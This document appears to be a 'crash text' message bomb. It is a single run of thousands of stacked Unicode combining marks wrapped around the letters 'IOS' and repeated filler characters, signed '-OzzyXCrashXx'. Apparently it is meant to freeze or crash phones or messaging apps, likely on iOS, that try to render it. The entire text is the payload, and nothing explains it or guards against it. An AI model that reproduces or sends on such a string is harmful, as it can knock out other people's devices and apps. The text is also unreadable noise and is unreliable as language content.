̡̡̢̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹́̈́̾͊̽̎̆̎̃̓̍̈̚͘͘͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̢̡̡̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͜͠͠͝͝͠͠ͅͅͅͅͅͅͅͅͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ-O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'
